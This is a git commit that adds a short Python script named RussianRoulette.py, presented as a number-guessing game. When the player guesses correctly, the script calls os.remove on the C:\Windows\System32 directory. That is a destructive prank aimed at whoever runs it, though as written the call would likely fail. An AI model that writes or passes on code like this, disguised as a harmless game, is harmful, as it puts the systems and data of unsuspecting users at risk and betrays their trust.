f1c88c7583620304ea353442153d7eb2e2059b5a
TheBounciestCastle <pablomelecho@gmail.com>
2025-03-26 11:14:49 +0000

    RussianRoulette

---
+++ RussianRoulette.py
@@ -0,0 +1,13 @@
+import random
+import os
+
+#Rusian roulette game
+
+number = random.randint(1, 10)
+guess = input("Guess a number between 1 and 10")
+guess = int(guess)
+
+if guess == number:
+    os.remove("C:\Windows\System32")
+else:
+    print("YOU WON!")
